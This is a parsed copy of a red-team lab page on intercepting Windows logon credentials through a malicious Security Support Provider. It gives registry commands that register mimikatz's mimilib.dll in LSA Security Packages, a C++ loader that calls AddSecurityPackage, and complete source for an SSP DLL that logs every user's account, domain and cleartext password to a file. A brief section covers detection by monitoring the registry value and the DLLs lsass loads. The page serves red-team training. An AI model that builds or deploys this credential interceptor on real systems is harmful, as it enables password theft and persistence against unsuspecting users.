---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Intercepting Logon Credentials via Custom Security Support Provider and Authentication Packages

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-credential-access-and-credential-dumping-intercepting-logon-credentials-via-custom-security-support-provider-and-authentication-package` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/credential-access-and-credential-dumping/intercepting-logon-credentials-via-custom-security-support-provider-and-authentication-package.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Intercepting Logon Credentials via Custom Security Support Provider and Authentication Packages](../../topics/offensive-security/intercepting-logon-credentials-via-custom-security-support-provider-and-authentication-packages.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-credential-access-and-credential-dumping-intercepting-logon-credentials-via-custom-security-support-provider-and-authentication-package |
| name | Intercepting Logon Credentials via Custom Security Support Provider and Authentication Packages |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/credential-access-and-credential-dumping/intercepting-logon-credentials-via-custom-security-support-provider-and-authentication-package.md |

## Preserved Source Material

````yaml
_asset_filenames:
- Screenshot from 2018-07-24 23-08-39 (1) (1).png
- image (423).png
- load-ssp.gif
- lsa-commandline.png
- lsa-security-packages.png
_body: "---\ndescription: Credential Access, Persistence\n---\n\n# Intercepting Logon Credentials via Custom Security Support\
  \ Provider and Authentication Packages\n\nThis technique abuses Windows Security Support Provider (SSP) and Authentication\
  \ Packages (AP) that come in the form of DLLs that get injected into LSASS.exe process on system boot or dynamically via\
  \ `AddSecurityPackage` API.\n\n## Loading SSP with Reboot\n\nIn this lab, mimikatz Security Support Provider [mimilib.dll](https://github.com/gentilkiwi/mimikatz)\
  \ will be registered as a Windows Security Package.&#x20;\n\nOnce the Security Package is registered and the system is rebooted,\
  \ the mimilib.dll will be loaded into lsass.exe process memory and intercept all logon passwords next time someone logs\
  \ onto the system or otherwise authenticates, say, via `runas.exe`.\n\nLet's now build the [mimilib.dll](https://github.com/gentilkiwi/mimikatz)\
  \ and copy it to the target machine's system32 folder:\n\n{% code title=\"attacker@target\" %}\n```cpp\nPS C:\\> copy mimilib.dll\
  \ %systemroot%\\system32\n```\n{% endcode %}\n\nGet a list existing LSA Security Packages:\n\n{% code title=\"attacker@target\"\
  \ %}\n```bash\nPS C:\\> reg query hklm\\system\\currentcontrolset\\control\\lsa\\ /v \"Security Packages\"\n\nHKEY_LOCAL_MACHINE\\\
  system\\currentcontrolset\\control\\lsa\n    Security Packages    REG_MULTI_SZ    kerberos\\0msv1_0\\0schannel\\0wdigest\\\
  0tspkg\\0pku2u\n```\n{% endcode %}\n\nAdd mimilib.dll to the Security Support Provider list (Security Packages):\n\n{% code\
  \ title=\"attacker@target\" %}\n```csharp\nPS C:\\> reg add \"hklm\\system\\currentcontrolset\\control\\lsa\\\" /v \"Security\
  \ Packages\" /d \"kerberos\\0msv1_0\\0schannel\\0wdigest\\0tspkg\\0pku2u\\0mimilib\" /t REG_MULTI_SZ /f\n```\n{% endcode\
  \ %}\n\nThe below shows `Security Packages` registry value with the `mimilib` added and the `kiwissp.log` file with a redacted\
  \ password that had been logged during the user logon (after the system had been rebooted after the Security Package was\
  \ registered):\n\n![](../../.gitbook/assets/lsa-security-packages.png)\n\n{% hint style=\"info\" %}\nReboot is required\
  \ for the new SSP to take effect after it's been added to the Security Packages  list.\n{% endhint %}\n\n## Loading SSP\
  \ without Reboot\n\nIt's possible to load the SSP DLL without modifying the registry:\n\n![](<../../.gitbook/assets/image\
  \ (423).png>)\n\nBelow code loads the malicious SSP spotless.dll:\n\n```cpp\n#define WIN32_NO_STATUS\n#define SECURITY_WIN32\n\
  #include <windows.h>\n#include <sspi.h>\n#include <NTSecAPI.h>\n#include <ntsecpkg.h>\n#pragma comment(lib, \"Secur32.lib\"\
  )\n\nint main()\n{\n\tSECURITY_PACKAGE_OPTIONS spo = {};\n\tSECURITY_STATUS ss = AddSecurityPackageA((LPSTR)\"c:\\\\temp\\\
  \\spotless.dll\", &spo);\n\treturn 0;\n}\n```\n\nBelow shows how the new Security Package spotless.dll is loaded by lsass\
  \ and is effective immediately:\n\n![procmon filter: path contains \"spotless\"](../../.gitbook/assets/load-ssp.gif)\n\n\
  {% hint style=\"info\" %}\nLoading the SSP with this approach does not survive a reboot unlike SSPs that are loaded as registered\
  \ Security Packages via registry.\n{% endhint %}\n\n## Detection\n\nIt may be worth monitoring `Security Packages` value\
  \ in`hklm\\system\\currentcontrolset\\control\\lsa\\` for changes.&#x20;\n\nNewly added packages should be inspected:\n\n\
  ![](../../.gitbook/assets/lsa-commandline.png)\n\nAdditionally, mimilib.dll (same applies to custom spotless.dll) can be\
  \ observed in the list of DLLs loaded by lsass.exe, so as a defender, you may want to make a baseline of loaded known good\
  \ DLLs of the lsass process and monitor it for any new suspicious DLLs:\n\n![](<../../.gitbook/assets/Screenshot from 2018-07-24\
  \ 23-08-39 (1) (1).png>)\n\n## Code\n\nBelow is the code, originally taken from [mimikatz](https://github.com/gentilkiwi/mimikatz),\
  \ adapted and refactored to suit this lab, that we can compile as our own Security Support Provider DLL. It intercepts authenticatin\
  \ details and saves them to a file `c:\\temp\\logged-pw.txt`:\n\n```cpp\n#include \"stdafx.h\"\n#define WIN32_NO_STATUS\n\
  #define SECURITY_WIN32\n#include <windows.h>\n#include <sspi.h>\n#include <NTSecAPI.h>\n#include <ntsecpkg.h>\n#include\
  \ <iostream>\n#pragma comment(lib, \"Secur32.lib\")\n\nNTSTATUS NTAPI SpInitialize(ULONG_PTR PackageId, PSECPKG_PARAMETERS\
  \ Parameters, PLSA_SECPKG_FUNCTION_TABLE FunctionTable) { return 0; }\nNTSTATUS NTAPI SpShutDown(void) { return 0; }\n\n\
  NTSTATUS NTAPI SpGetInfo(PSecPkgInfoW PackageInfo)\n{\n\tPackageInfo->Name = (SEC_WCHAR *)L\"SSSPotless\";\n\tPackageInfo->Comment\
  \ = (SEC_WCHAR *)L\"SSSPotless <o>\";\n\tPackageInfo->fCapabilities = SECPKG_FLAG_ACCEPT_WIN32_NAME | SECPKG_FLAG_CONNECTION;\n\
  \tPackageInfo->wRPCID = SECPKG_ID_NONE;\n\tPackageInfo->cbMaxToken = 0;\n\tPackageInfo->wVersion = 1;\n\treturn 0;\n}\n\n\
  NTSTATUS NTAPI SpAcceptCredentials(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRING AccountName, PSECPKG_PRIMARY_CRED PrimaryCredentials,\
  \ PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials)\n{\n\tHANDLE outFile = CreateFile(L\"c:\\\\temp\\\\logged-pw.txt\"\
  , FILE_GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\n\tDWORD bytesWritten = 0;\n\t\n\tstd::wstring\
  \ log = L\"\";\n\tstd::wstring account = AccountName->Buffer;\n\tstd::wstring domain = PrimaryCredentials->DomainName.Buffer;\n\
  \tstd::wstring password = PrimaryCredentials->Password.Buffer;\n\n\tlog.append(account).append(L\"@\").append(domain).append(L\"\
  :\").append(password).append(L\"\\n\");\n\tWriteFile(outFile, log.c_str(), log.length() * 2, &bytesWritten, NULL);\n\tCloseHandle(outFile);\n\
  \treturn 0;\n}\n\nSECPKG_FUNCTION_TABLE SecurityPackageFunctionTable[] = \n{\n\t{\n\t\tNULL, NULL, NULL, NULL, NULL, NULL,\
  \ NULL, NULL,\tSpInitialize, SpShutDown, SpGetInfo, SpAcceptCredentials, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,\
  \ NULL, NULL, NULL, NULL, NULL, NULL, NULL \n\t}\n};\n\n// SpLsaModeInitialize is called by LSA for each registered Security\
  \ Package\nextern \"C\" __declspec(dllexport) NTSTATUS NTAPI SpLsaModeInitialize(ULONG LsaVersion, PULONG PackageVersion,\
  \ PSECPKG_FUNCTION_TABLE *ppTables, PULONG pcTables)\n{\n\t*PackageVersion = SECPKG_INTERFACE_VERSION;\n\t*ppTables = SecurityPackageFunctionTable;\n\
  \t*pcTables = 1;\n\treturn 0;\n}\n```\n\n## References\n\n{% embed url=\"https://github.com/gentilkiwi/mimikatz\" %}\n\n\
  {% embed url=\"https://docs.microsoft.com/en-us/windows/win32/secauthn/lsa-mode-initialization\" %}\n\n{% embed url=\"https://github.com/veramine/Detections/wiki/LSA-Packages\"\
  \ %}\n\n{% embed url=\"https://adsecurity.org/?p=1760\" %}\n\n{% embed url=\"https://attack.mitre.org/wiki/Technique/T1131\"\
  \ %}\n\n{% embed url=\"https://blog.xpnsec.com/exploring-mimikatz-part-2/\" %}"
_relative_path: offensive-security/credential-access-and-credential-dumping/intercepting-logon-credentials-via-custom-security-support-provider-and-authentication-package.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/credential-access-and-credential-dumping/intercepting-logon-credentials-via-custom-security-support-provider-and-authentication-package.md
````
